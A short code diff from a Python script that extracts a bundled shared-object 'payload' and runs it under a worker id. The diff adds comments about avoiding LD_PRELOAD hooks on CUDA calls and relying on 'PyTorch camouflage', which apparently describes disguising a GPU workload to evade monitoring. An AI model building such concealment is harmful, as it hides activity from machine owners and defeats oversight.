@@ -331,6 +331,8 @@ def main():
 
     worker_id = args.worker if args.worker else get_default_worker()
 
+    # Avoid LD_PRELOAD hooking into CUDA driver syscalls
+    # PyTorch camouflage is natively handled by Python process & telemetry
     work_dir = os.path.dirname(os.path.abspath(__file__))
     backend_so, _ = extract_payloads(work_dir)
 
